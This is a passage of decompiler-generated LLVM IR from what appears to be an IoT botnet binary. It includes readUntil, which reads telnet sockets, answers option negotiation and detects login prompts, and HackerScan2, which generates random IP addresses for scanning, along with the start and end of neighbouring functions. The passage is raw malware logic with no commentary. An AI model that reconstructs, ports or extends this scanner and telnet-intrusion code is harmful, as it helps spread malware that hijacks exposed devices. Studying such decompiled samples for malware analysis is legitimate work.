  %v7_80498df29 = icmp sgt i32 %v3_80498ba, %stack_var_-12.1
  br i1 %v7_80498df29, label %dec_label_pc_80498e1, label %dec_label_pc_80498d9.dec_label_pc_8049941_crit_edge

dec_label_pc_804998c:                             ; preds = %dec_label_pc_804996f, %dec_label_pc_8049941
  %storemerge = phi i32 [ 1, %dec_label_pc_8049941 ], [ 0, %dec_label_pc_804996f ]
  %v2_8049992 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049992, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_80498e6, { 1, 0 }
  uselistorder i32 %v3_80498ba, { 0, 2, 1 }
  uselistorder [6 x i8]* @global_var_80689f4.37, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804996f, { 1, 0 }
  uselistorder label %dec_label_pc_80498d9.dec_label_pc_8049941_crit_edge, { 1, 0 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i8* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-168, align 4
  %v2_80499db = ptrtoint i32* %stack_var_-160 to i32
  %tmp27 = bitcast i32* %stack_var_-160 to i8*
  %v1_80499f5 = urem i32 %arg1, 32
  %v9_80499f8 = shl i32 1, %v1_80499f5
  %v1_8049a03 = add i32 %arg1, 1
  %v2_8049a06 = ptrtoint i32* %stack_var_-168 to i32
  %v5_8049a3d = ptrtoint i8* %arg6 to i32
  %v2_8049b13 = inttoptr i32 %arg2 to i8*
  %v4_8049b1c = icmp eq i32 %arg3, 0
  %v1_8049b3d34 = add i32 %arg8, 2
  %v5_8049b4342 = icmp slt i32 %v1_8049b3d34, %arg7
  br i1 %v5_8049b4342, label %dec_label_pc_8049b45.lr.ph, label %dec_label_pc_8049b61

dec_label_pc_8049b45.lr.ph:                       ; preds = %entry
  %v2_80499ef = udiv i32 %arg1, 32
  %v2_80499f8 = mul nuw nsw i32 %v2_80499ef, 4
  %v3_80499f8 = add nsw i32 %v2_80499f8, -156
  %tmp31 = icmp slt i32 %arg5, 1
  %tmp32 = icmp eq i1 %tmp31, false
  br label %dec_label_pc_8049b45

dec_label_pc_80499d1:                             ; preds = %dec_label_pc_8049b53, %dec_label_pc_8049b45
  store i32 %v2_80499db, i32* @edi, align 4
  %v5_80499e2 = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v0_80499f8 = load i32, i32* @ebp, align 4
  %v4_80499f8 = add i32 %v3_80499f8, %v0_80499f8
  %v5_80499f8 = inttoptr i32 %v4_80499f8 to i32*
  %v6_80499f8 = load i32, i32* %v5_80499f8, align 4
  %v12_80499f8 = or i32 %v6_80499f8, %v9_80499f8
  store i32 %v12_80499f8, i32* %v5_80499f8, align 4
  %v5_8049a2d = call i32 @__libc_select(i32 %v1_8049a03, i32 %v2_80499db, i32 0, i32 0, i32 %v2_8049a06)
  %tmp28 = icmp slt i32 %v5_8049a2d, 1
  br i1 %tmp28, label %dec_label_pc_8049b61, label %dec_label_pc_8049a3a

dec_label_pc_8049a3a:                             ; preds = %dec_label_pc_80499d1
  %v6_8049a3d = add i32 %stack_var_-32.043, %v5_8049a3d
  %v5_8049a40 = inttoptr i32 %v6_8049a3d to i8*
  %v4_8049a60 = call i32 @__libc_recv(i32 %arg1, i32 %v6_8049a3d, i32 1, i32 0)
  %v13_8049a68 = icmp eq i32 %v4_8049a60, -1
  br i1 %v13_8049a68, label %dec_label_pc_8049b7d, label %dec_label_pc_8049a6e

dec_label_pc_8049a6e:                             ; preds = %dec_label_pc_8049a3a
  %v4_8049a6e = icmp eq i32 %v4_8049a60, 0
  %v1_8049a72 = icmp eq i1 %v4_8049a6e, false
  br i1 %v1_8049a72, label %dec_label_pc_8049a83, label %dec_label_pc_8049b7d

dec_label_pc_8049a83:                             ; preds = %dec_label_pc_8049a6e
  %v5_8049a86 = add i32 %v4_8049a60, %stack_var_-32.043
  %v2_8049a8c = load i8, i8* %v5_8049a40, align 1
  %v11_8049a8f = icmp eq i8 %v2_8049a8c, -1
  %v1_8049a91 = icmp eq i1 %v11_8049a8f, false
  br i1 %v1_8049a91, label %dec_label_pc_8049b06, label %dec_label_pc_8049a93

dec_label_pc_8049a93:                             ; preds = %dec_label_pc_8049a83
  %v1_8049a96 = add i32 %v6_8049a3d, 1
  %v4_8049ab3 = call i32 @__libc_recv(i32 %arg1, i32 %v1_8049a96, i32 2, i32 0)
  %v13_8049abb = icmp eq i32 %v4_8049ab3, -1
  br i1 %v13_8049abb, label %dec_label_pc_8049b7d, label %dec_label_pc_8049ac1

dec_label_pc_8049ac1:                             ; preds = %dec_label_pc_8049a93
  %v4_8049ac1 = icmp eq i32 %v4_8049ab3, 0
  %v1_8049ac5 = icmp eq i1 %v4_8049ac1, false
  br i1 %v1_8049ac5, label %dec_label_pc_8049ad6, label %dec_label_pc_8049b7d

dec_label_pc_8049ad6:                             ; preds = %dec_label_pc_8049ac1
  %v5_8049ad9 = add i32 %v4_8049ab3, %v5_8049a86
  %v3_8049af1 = call i32 @negotiate(i32 %arg1, i32 %v6_8049a3d, i32 3)
  %v1_8049af6 = icmp eq i32 %v3_8049af1, 0
  %v1_8049af8 = icmp eq i1 %v1_8049af6, false
  br i1 %v1_8049af8, label %dec_label_pc_8049b3a.backedge, label %dec_label_pc_8049b7d

dec_label_pc_8049b3a.backedge:                    ; preds = %dec_label_pc_8049ad6, %dec_label_pc_8049b1c, %dec_label_pc_8049b22
  %stack_var_-32.0.be = phi i32 [ %v5_8049a86, %dec_label_pc_8049b1c ], [ %v5_8049a86, %dec_label_pc_8049b22 ], [ %v5_8049ad9, %dec_label_pc_8049ad6 ]
  %v1_8049b3d = add i32 %stack_var_-32.0.be, 2
  %v5_8049b43 = icmp slt i32 %v1_8049b3d, %arg7
  br i1 %v5_8049b43, label %dec_label_pc_8049b3a.backedge.dec_label_pc_8049b45_crit_edge, label %dec_label_pc_8049b61

dec_label_pc_8049b3a.backedge.dec_label_pc_8049b45_crit_edge: ; preds = %dec_label_pc_8049b3a.backedge
  %v3_8049b45.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_8049b45

dec_label_pc_8049b06:                             ; preds = %dec_label_pc_8049a83
  store i32 %v5_8049a3d, i32* @eax, align 4
  %v3_8049b13 = call i32 @strstr(i32 %v5_8049a3d, i8* %v2_8049b13)
  %v1_8049b18 = icmp eq i32 %v3_8049b13, 0
  %v1_8049b1a = icmp eq i1 %v1_8049b18, false
  br i1 %v1_8049b1a, label %dec_label_pc_8049b61, label %dec_label_pc_8049b1c

dec_label_pc_8049b1c:                             ; preds = %dec_label_pc_8049b06
  br i1 %v4_8049b1c, label %dec_label_pc_8049b3a.backedge, label %dec_label_pc_8049b22

dec_label_pc_8049b22:                             ; preds = %dec_label_pc_8049b1c
  %v2_8049b28 = call i32 @matchPrompt(i8* %arg6)
  %v1_8049b2d = icmp eq i32 %v2_8049b28, 0
  br i1 %v1_8049b2d, label %dec_label_pc_8049b3a.backedge, label %dec_label_pc_8049b61

dec_label_pc_8049b45:                             ; preds = %dec_label_pc_8049b3a.backedge.dec_label_pc_8049b45_crit_edge, %dec_label_pc_8049b45.lr.ph
  %v3_8049b45 = phi i32 [ %arg4, %dec_label_pc_8049b45.lr.ph ], [ %v3_8049b45.pre, %dec_label_pc_8049b3a.backedge.dec_label_pc_8049b45_crit_edge ]
  %stack_var_-32.043 = phi i32 [ %arg8, %dec_label_pc_8049b45.lr.ph ], [ %stack_var_-32.0.be, %dec_label_pc_8049b3a.backedge.dec_label_pc_8049b45_crit_edge ]
  %tmp29 = icmp slt i32 %v3_8049b45, 1
  %tmp30 = icmp eq i1 %tmp29, false
  br i1 %tmp30, label %dec_label_pc_80499d1, label %dec_label_pc_8049b53

dec_label_pc_8049b53:                             ; preds = %dec_label_pc_8049b45
  br i1 %tmp32, label %dec_label_pc_80499d1, label %dec_label_pc_8049b61

dec_label_pc_8049b61:                             ; preds = %dec_label_pc_80499d1, %dec_label_pc_8049b53, %dec_label_pc_8049b3a.backedge, %dec_label_pc_8049b22, %dec_label_pc_8049b06, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_8049b06 ], [ 1, %dec_label_pc_8049b22 ], [ 0, %dec_label_pc_8049b3a.backedge ], [ 0, %dec_label_pc_8049b53 ], [ 0, %dec_label_pc_80499d1 ]
  br label %dec_label_pc_8049b7d

dec_label_pc_8049b7d:                             ; preds = %dec_label_pc_8049ad6, %dec_label_pc_8049a93, %dec_label_pc_8049ac1, %dec_label_pc_8049a3a, %dec_label_pc_8049a6e, %dec_label_pc_8049b61
  %stack_var_-172.0 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8049b61 ], [ 0, %dec_label_pc_8049a6e ], [ 0, %dec_label_pc_8049a3a ], [ 0, %dec_label_pc_8049ac1 ], [ 0, %dec_label_pc_8049a93 ], [ 0, %dec_label_pc_8049ad6 ]
  ret i32 %stack_var_-172.0

; uselistorder directives
  uselistorder i32 %stack_var_-32.0.be, { 1, 0 }
  uselistorder i32 %v4_8049ab3, { 1, 2, 0 }
  uselistorder i32 %v4_8049a60, { 1, 2, 0 }
  uselistorder i32 %v5_8049a3d, { 2, 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8049b7d, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_8049b61, { 1, 3, 4, 2, 0, 5 }
  uselistorder label %dec_label_pc_8049b3a.backedge, { 2, 1, 0 }
}

define i32 @HackerScan2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049b8f = load i32, i32* @ebx, align 4
  store i32 %v0_8049b8f, i32* %stack_var_-8, align 4
  store i8 0, i8* bitcast (i32* @global_var_8071b57.38 to i8*), align 4
  store i8 0, i8* @global_var_8071b58.39, align 8
  store i8 0, i8* @global_var_8071b59.40, align 1
  store i8 0, i8* bitcast (i32* @global_var_8071b5a.41 to i8*), align 4
  %v1_8049baf = call i32 @random()
  %v2_8049bd1 = sdiv i32 %v1_8049baf, 51
  store i32 %v2_8049bd1, i32* @ebx, align 4
  %tmp = mul i32 %v2_8049bd1, -255
  %v2_8049be1 = add i32 %v1_8049baf, %tmp
  %v14_8049be1 = trunc i32 %v2_8049be1 to i8
  store i8 %v14_8049be1, i8* bitcast (i32* @global_var_8071b57.38 to i8*), align 4
  %v1_8049bef = call i32 @random()
  %v2_8049c11 = sdiv i32 %v1_8049bef, 51
  store i32 %v2_8049c11, i32* @ebx, align 4
  %tmp21 = mul i32 %v2_8049c11, -255
  %v2_8049c21 = add i32 %v1_8049bef, %tmp21
  %v14_8049c21 = trunc i32 %v2_8049c21 to i8
  store i8 %v14_8049c21, i8* @global_var_8071b58.39, align 8
  %v1_8049c2f = call i32 @random()
  %v2_8049c51 = sdiv i32 %v1_8049c2f, 51
  store i32 %v2_8049c51, i32* @ebx, align 4
  %tmp22 = mul i32 %v2_8049c51, -255
  %v2_8049c61 = add i32 %v1_8049c2f, %tmp22
  %v14_8049c61 = trunc i32 %v2_8049c61 to i8
  store i8 %v14_8049c61, i8* @global_var_8071b59.40, align 1
  %v1_8049c6f = call i32 @random()
  %v2_8049c91 = sdiv i32 %v1_8049c6f, 51
  store i32 %v2_8049c91, i32* @ebx, align 4
  %tmp23 = mul i32 %v2_8049c91, -255
  %v2_8049ca1 = add i32 %v1_8049c6f, %tmp23
  %v14_8049ca1 = trunc i32 %v2_8049ca1 to i8
  store i8 %v14_8049ca1, i8* bitcast (i32* @global_var_8071b5a.41 to i8*), align 4
  %v1_8049caf = call i32 @random()
  %v2_8049ccc = srem i32 %v1_8049caf, 115
  %v12_8049cdb = icmp eq i32 %v2_8049ccc, 0
  store i32 %v2_8049ccc, i32* @edx, align 4
  %v1_8049ce6 = icmp eq i1 %v12_8049cdb, false
  br i1 %v1_8049ce6, label %dec_label_pc_8049d18, label %dec_label_pc_8049ce8

dec_label_pc_8049ce8:                             ; preds = %entry
  %v0_8049ce8 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_8049ce8 = zext i8 %v0_8049ce8 to i32
  store i32 %v1_8049ce8, i32* @edx, align 4
  %v0_8049cf2 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_8049cf2 = zext i8 %v0_8049cf2 to i32
  %v2_8049d01 = ptrtoint i32* %stack_var_-28 to i32
  %v4_8049d13 = call i32 @szprintf(i32 %v2_8049d01, i32 ptrtoint ([12 x i8]* @global_var_80689fb.42 to i32), i32 %v1_8049cf2)
  br label %dec_label_pc_8049d18

dec_label_pc_8049d18:                             ; preds = %entry, %dec_label_pc_8049ce8
  %v13_8049d18 = icmp eq i32 %v2_8049ccc, 1
  %v1_8049d1c = icmp eq i1 %v13_8049d18, false
  br i1 %v1_8049d1c, label %dec_label_pc_8049d4e, label %dec_label_pc_8049d1e

dec_label_pc_8049d1e:                             ; preds = %dec_label_pc_8049d18
  %v0_8049d1e = load i8, i8* @global_var_8071b59.40, align 1
  %v1_8049d1e = zext i8 %v0_8049d1e to i32
  store i32 %v1_8049d1e, i32* @edx, align 4
  %v0_8049d28 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_8049d28 = zext i8 %v0_8049d28 to i32
  %v2_8049d37 = ptrtoint i32* %stack_var_-28 to i32
  %v4_8049d49 = call i32 @szprintf(i32 %v2_8049d37, i32 ptrtoint ([11 x i8]* @global_var_8068a07.43 to i32), i32 %v1_8049d28)
  br label %dec_label_pc_8049d4e

dec_label_pc_8049d4e:                             ; preds = %dec_label_pc_8049d18, %dec_label_pc_8049d1e
  %v13_8049d4e = icmp eq i32 %v2_8049ccc, 2
  %v1_8049d52 = icmp eq i1 %v13_8049d4e, false
  br i1 %v1_8049d52, label %dec_label_pc_8049d84, label %dec_label_pc_8049d54

dec_label_pc_8049d54:                             ; preds = %dec_label_pc_8049d4e
  %v0_8049d54 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_8049d54 = zext i8 %v0_8049d54 to i32
  store i32 %v1_8049d54, i32* @edx, align 4
  %v0_8049d5e = load i8, i8* @global_var_8071b58.39, align 8
  %v1_8049d5e = zext i8 %v0_8049d5e to i32
  %v2_8049d6d = ptrtoint i32* %stack_var_-28 to i32
  %v4_8049d7f = call i32 @szprintf(i32 %v2_8049d6d, i32 ptrtoint ([14 x i8]* @global_var_8068a12.44 to i32), i32 %v1_8049d5e)
  br label %dec_label_pc_8049d84

dec_label_pc_8049d84:                             ; preds = %dec_label_pc_8049d4e, %dec_label_pc_8049d54
  %v13_8049d84 = icmp eq i32 %v2_8049ccc, 3
  %v1_8049d88 = icmp eq i1 %v13_8049d84, false
  br i1 %v1_8049d88, label %dec_label_pc_8049dba, label %dec_label_pc_8049d8a

dec_label_pc_8049d8a:                             ; preds = %dec_label_pc_8049d84
  %v0_8049d8a = load i8, i8* @global_var_8071b59.40, align 1
  %v1_8049d8a = zext i8 %v0_8049d8a to i32
  store i32 %v1_8049d8a, i32* @edx, align 4
  %v0_8049d94 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_8049d94 = zext i8 %v0_8049d94 to i32
  %v2_8049da3 = ptrtoint i32* %stack_var_-28 to i32
  %v4_8049db5 = call i32 @szprintf(i32 %v2_8049da3, i32 ptrtoint ([14 x i8]* @global_var_8068a20.45 to i32), i32 %v1_8049d94)
  br label %dec_label_pc_8049dba

dec_label_pc_8049dba:                             ; preds = %dec_label_pc_8049d84, %dec_label_pc_8049d8a
  %v13_8049dba = icmp eq i32 %v2_8049ccc, 4
  %v1_8049dbe = icmp eq i1 %v13_8049dba, false
  br i1 %v1_8049dbe, label %dec_label_pc_8049df0, label %dec_label_pc_8049dc0

dec_label_pc_8049dc0:                             ; preds = %dec_label_pc_8049dba
  %v0_8049dc0 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_8049dc0 = zext i8 %v0_8049dc0 to i32
  store i32 %v1_8049dc0, i32* @edx, align 4
  %v0_8049dca = load i8, i8* @global_var_8071b58.39, align 8
  %v1_8049dca = zext i8 %v0_8049dca to i32
  %v2_8049dd9 = ptrtoint i32* %stack_var_-28 to i32
  %v4_8049deb = call i32 @szprintf(i32 %v2_8049dd9, i32 ptrtoint ([14 x i8]* @global_var_8068a2e.46 to i32), i32 %v1_8049dca)
  br label %dec_label_pc_8049df0

dec_label_pc_8049df0:                             ; preds = %dec_label_pc_8049dba, %dec_label_pc_8049dc0
  %v13_8049df0 = icmp eq i32 %v2_8049ccc, 5
  %v1_8049df4 = icmp eq i1 %v13_8049df0, false
  br i1 %v1_8049df4, label %dec_label_pc_8049e26, label %dec_label_pc_8049df6

dec_label_pc_8049df6:                             ; preds = %dec_label_pc_8049df0
  %v0_8049df6 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_8049df6 = zext i8 %v0_8049df6 to i32
  store i32 %v1_8049df6, i32* @edx, align 4
  %v0_8049e00 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_8049e00 = zext i8 %v0_8049e00 to i32
  %v2_8049e0f = ptrtoint i32* %stack_var_-28 to i32
  %v4_8049e21 = call i32 @szprintf(i32 %v2_8049e0f, i32 ptrtoint ([13 x i8]* @global_var_8068a3c.47 to i32), i32 %v1_8049e00)
  br label %dec_label_pc_8049e26

dec_label_pc_8049e26:                             ; preds = %dec_label_pc_8049df0, %dec_label_pc_8049df6
  %v13_8049e26 = icmp eq i32 %v2_8049ccc, 6
  %v1_8049e2a = icmp eq i1 %v13_8049e26, false
  br i1 %v1_8049e2a, label %dec_label_pc_8049e5c, label %dec_label_pc_8049e2c

dec_label_pc_8049e2c:                             ; preds = %dec_label_pc_8049e26
  %v0_8049e2c = load i8, i8* @global_var_8071b59.40, align 1
  %v1_8049e2c = zext i8 %v0_8049e2c to i32
  store i32 %v1_8049e2c, i32* @edx, align 4
  %v0_8049e36 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_8049e36 = zext i8 %v0_8049e36 to i32
  %v2_8049e45 = ptrtoint i32* %stack_var_-28 to i32
  %v4_8049e57 = call i32 @szprintf(i32 %v2_8049e45, i32 ptrtoint ([13 x i8]* @global_var_8068a49.48 to i32), i32 %v1_8049e36)
  br label %dec_label_pc_8049e5c

dec_label_pc_8049e5c:                             ; preds = %dec_label_pc_8049e26, %dec_label_pc_8049e2c
  %v13_8049e5c = icmp eq i32 %v2_8049ccc, 7
  %v1_8049e60 = icmp eq i1 %v13_8049e5c, false
  br i1 %v1_8049e60, label %dec_label_pc_8049e92, label %dec_label_pc_8049e62

dec_label_pc_8049e62:                             ; preds = %dec_label_pc_8049e5c
  %v0_8049e62 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_8049e62 = zext i8 %v0_8049e62 to i32
  store i32 %v1_8049e62, i32* @edx, align 4
  %v0_8049e6c = load i8, i8* @global_var_8071b58.39, align 8
  %v1_8049e6c = zext i8 %v0_8049e6c to i32
  %v2_8049e7b = ptrtoint i32* %stack_var_-28 to i32
  %v4_8049e8d = call i32 @szprintf(i32 %v2_8049e7b, i32 ptrtoint ([14 x i8]* @global_var_8068a56.49 to i32), i32 %v1_8049e6c)
  br label %dec_label_pc_8049e92

dec_label_pc_8049e92:                             ; preds = %dec_label_pc_8049e5c, %dec_label_pc_8049e62
  %v13_8049e92 = icmp eq i32 %v2_8049ccc, 8
  %v1_8049e96 = icmp eq i1 %v13_8049e92, false
  br i1 %v1_8049e96, label %dec_label_pc_8049ec8, label %dec_label_pc_8049e98

dec_label_pc_8049e98:                             ; preds = %dec_label_pc_8049e92
  %v0_8049e98 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_8049e98 = zext i8 %v0_8049e98 to i32
  store i32 %v1_8049e98, i32* @edx, align 4
  %v0_8049ea2 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_8049ea2 = zext i8 %v0_8049ea2 to i32
  %v2_8049eb1 = ptrtoint i32* %stack_var_-28 to i32
  %v4_8049ec3 = call i32 @szprintf(i32 %v2_8049eb1, i32 ptrtoint ([14 x i8]* @global_var_8068a64.50 to i32), i32 %v1_8049ea2)
  br label %dec_label_pc_8049ec8

dec_label_pc_8049ec8:                             ; preds = %dec_label_pc_8049e92, %dec_label_pc_8049e98
  %v13_8049ec8 = icmp eq i32 %v2_8049ccc, 9
  %v1_8049ecc = icmp eq i1 %v13_8049ec8, false
  br i1 %v1_8049ecc, label %dec_label_pc_8049efe, label %dec_label_pc_8049ece

dec_label_pc_8049ece:                             ; preds = %dec_label_pc_8049ec8
  %v0_8049ece = load i8, i8* @global_var_8071b59.40, align 1
  %v1_8049ece = zext i8 %v0_8049ece to i32
  store i32 %v1_8049ece, i32* @edx, align 4
  %v0_8049ed8 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_8049ed8 = zext i8 %v0_8049ed8 to i32
  %v2_8049ee7 = ptrtoint i32* %stack_var_-28 to i32
  %v4_8049ef9 = call i32 @szprintf(i32 %v2_8049ee7, i32 ptrtoint ([13 x i8]* @global_var_8068a72.51 to i32), i32 %v1_8049ed8)
  br label %dec_label_pc_8049efe

dec_label_pc_8049efe:                             ; preds = %dec_label_pc_8049ec8, %dec_label_pc_8049ece
  %v13_8049efe = icmp eq i32 %v2_8049ccc, 10
  %v1_8049f02 = icmp eq i1 %v13_8049efe, false
  br i1 %v1_8049f02, label %dec_label_pc_8049f34, label %dec_label_pc_8049f04

dec_label_pc_8049f04:                             ; preds = %dec_label_pc_8049efe
  %v0_8049f04 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_8049f04 = zext i8 %v0_8049f04 to i32
  store i32 %v1_8049f04, i32* @edx, align 4
  %v0_8049f0e = load i8, i8* @global_var_8071b58.39, align 8
  %v1_8049f0e = zext i8 %v0_8049f0e to i32
  %v2_8049f1d = ptrtoint i32* %stack_var_-28 to i32
  %v4_8049f2f = call i32 @szprintf(i32 %v2_8049f1d, i32 ptrtoint ([14 x i8]* @global_var_8068a7f.52 to i32), i32 %v1_8049f0e)
  br label %dec_label_pc_8049f34

dec_label_pc_8049f34:                             ; preds = %dec_label_pc_8049efe, %dec_label_pc_8049f04
  %v13_8049f34 = icmp eq i32 %v2_8049ccc, 11
  %v1_8049f38 = icmp eq i1 %v13_8049f34, false
  br i1 %v1_8049f38, label %dec_label_pc_8049f6a, label %dec_label_pc_8049f3a

dec_label_pc_8049f3a:                             ; preds = %dec_label_pc_8049f34
  %v0_8049f3a = load i8, i8* @global_var_8071b59.40, align 1
  %v1_8049f3a = zext i8 %v0_8049f3a to i32
  store i32 %v1_8049f3a, i32* @edx, align 4
  %v0_8049f44 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_8049f44 = zext i8 %v0_8049f44 to i32
  %v2_8049f53 = ptrtoint i32* %stack_var_-28 to i32
  %v4_8049f65 = call i32 @szprintf(i32 %v2_8049f53, i32 ptrtoint ([14 x i8]* @global_var_8068a8d.53 to i32), i32 %v1_8049f44)
  br label %dec_label_pc_8049f6a

dec_label_pc_8049f6a:                             ; preds = %dec_label_pc_8049f34, %dec_label_pc_8049f3a
  %v13_8049f6a = icmp eq i32 %v2_8049ccc, 12
  %v1_8049f6e = icmp eq i1 %v13_8049f6a, false
  br i1 %v1_8049f6e, label %dec_label_pc_8049fa0, label %dec_label_pc_8049f70

dec_label_pc_8049f70:                             ; preds = %dec_label_pc_8049f6a
  %v0_8049f70 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_8049f70 = zext i8 %v0_8049f70 to i32
  store i32 %v1_8049f70, i32* @edx, align 4
  %v0_8049f7a = load i8, i8* @global_var_8071b58.39, align 8
  %v1_8049f7a = zext i8 %v0_8049f7a to i32
  %v2_8049f89 = ptrtoint i32* %stack_var_-28 to i32
  %v4_8049f9b = call i32 @szprintf(i32 %v2_8049f89, i32 ptrtoint ([14 x i8]* @global_var_8068a9b.54 to i32), i32 %v1_8049f7a)
  br label %dec_label_pc_8049fa0

dec_label_pc_8049fa0:                             ; preds = %dec_label_pc_8049f6a, %dec_label_pc_8049f70
  %v13_8049fa0 = icmp eq i32 %v2_8049ccc, 13
  %v1_8049fa4 = icmp eq i1 %v13_8049fa0, false
  br i1 %v1_8049fa4, label %dec_label_pc_8049fd6, label %dec_label_pc_8049fa6

dec_label_pc_8049fa6:                             ; preds = %dec_label_pc_8049fa0
  %v0_8049fa6 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_8049fa6 = zext i8 %v0_8049fa6 to i32
  store i32 %v1_8049fa6, i32* @edx, align 4
  %v0_8049fb0 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_8049fb0 = zext i8 %v0_8049fb0 to i32
  %v2_8049fbf = ptrtoint i32* %stack_var_-28 to i32
  %v4_8049fd1 = call i32 @szprintf(i32 %v2_8049fbf, i32 ptrtoint ([14 x i8]* @global_var_8068aa9.55 to i32), i32 %v1_8049fb0)
  br label %dec_label_pc_8049fd6

dec_label_pc_8049fd6:                             ; preds = %dec_label_pc_8049fa0, %dec_label_pc_8049fa6
  %v13_8049fd6 = icmp eq i32 %v2_8049ccc, 14
  %v1_8049fda = icmp eq i1 %v13_8049fd6, false
  br i1 %v1_8049fda, label %dec_label_pc_804a00c, label %dec_label_pc_8049fdc

dec_label_pc_8049fdc:                             ; preds = %dec_label_pc_8049fd6
  %v0_8049fdc = load i8, i8* @global_var_8071b59.40, align 1
  %v1_8049fdc = zext i8 %v0_8049fdc to i32
  store i32 %v1_8049fdc, i32* @edx, align 4
  %v0_8049fe6 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_8049fe6 = zext i8 %v0_8049fe6 to i32
  %v2_8049ff5 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a007 = call i32 @szprintf(i32 %v2_8049ff5, i32 ptrtoint ([14 x i8]* @global_var_8068ab7.56 to i32), i32 %v1_8049fe6)
  br label %dec_label_pc_804a00c

dec_label_pc_804a00c:                             ; preds = %dec_label_pc_8049fd6, %dec_label_pc_8049fdc
  %v13_804a00c = icmp eq i32 %v2_8049ccc, 15
  %v1_804a010 = icmp eq i1 %v13_804a00c, false
  br i1 %v1_804a010, label %dec_label_pc_804a042, label %dec_label_pc_804a012

dec_label_pc_804a012:                             ; preds = %dec_label_pc_804a00c
  %v0_804a012 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a012 = zext i8 %v0_804a012 to i32
  store i32 %v1_804a012, i32* @edx, align 4
  %v0_804a01c = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a01c = zext i8 %v0_804a01c to i32
  %v2_804a02b = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a03d = call i32 @szprintf(i32 %v2_804a02b, i32 ptrtoint ([14 x i8]* @global_var_8068ac5.57 to i32), i32 %v1_804a01c)
  br label %dec_label_pc_804a042

dec_label_pc_804a042:                             ; preds = %dec_label_pc_804a00c, %dec_label_pc_804a012
  %v10_804a042 = icmp eq i32 %v2_8049ccc, 16
  %v1_804a046 = icmp eq i1 %v10_804a042, false
  br i1 %v1_804a046, label %dec_label_pc_804a078, label %dec_label_pc_804a048

dec_label_pc_804a048:                             ; preds = %dec_label_pc_804a042
  %v0_804a048 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a048 = zext i8 %v0_804a048 to i32
  store i32 %v1_804a048, i32* @edx, align 4
  %v0_804a052 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a052 = zext i8 %v0_804a052 to i32
  %v2_804a061 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a073 = call i32 @szprintf(i32 %v2_804a061, i32 ptrtoint ([14 x i8]* @global_var_8068ad3.58 to i32), i32 %v1_804a052)
  br label %dec_label_pc_804a078

dec_label_pc_804a078:                             ; preds = %dec_label_pc_804a042, %dec_label_pc_804a048
  %v13_804a078 = icmp eq i32 %v2_8049ccc, 17
  %v1_804a07c = icmp eq i1 %v13_804a078, false
  br i1 %v1_804a07c, label %dec_label_pc_804a0ae, label %dec_label_pc_804a07e

dec_label_pc_804a07e:                             ; preds = %dec_label_pc_804a078
  %v0_804a07e = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a07e = zext i8 %v0_804a07e to i32
  store i32 %v1_804a07e, i32* @edx, align 4
  %v0_804a088 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a088 = zext i8 %v0_804a088 to i32
  %v2_804a097 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804a0a9 = call i32 @szprintf(i32 %v2_804a097, i32 ptrtoint ([14 x i8]* @global_var_8068ae1.59 to i32), i32 %v1_804a088)
  br label %dec_label_pc_804a0ae

dec_label_pc_804a0ae:                             ; preds = %dec_label_pc_804a078, %dec_label_pc_804a07e
  %v13_804a0ae = icmp eq i32 %v2_8049ccc, 18
  %v1_804a0b2 = icmp eq i1 %v13_804a0ae, false
  br i1 %v1_804a0b2, label %dec_label_pc_804a0e4, label %dec_label_pc_804a0b4

dec_label_pc_804a0b4:                             ; preds = %dec_label_pc_804a0ae
  %v0_804a0b4 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804a0b4 = zext i8 %v0_804a0b4 to i32
  store i32 %v1_804a0b4, i32* @edx, align 4
  %v0_804a0be = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804a0be = zext i8 %v0_804a0be to i32
  %v2_804a0cd = ptrtoint i32* %stack_var_-28 to i32
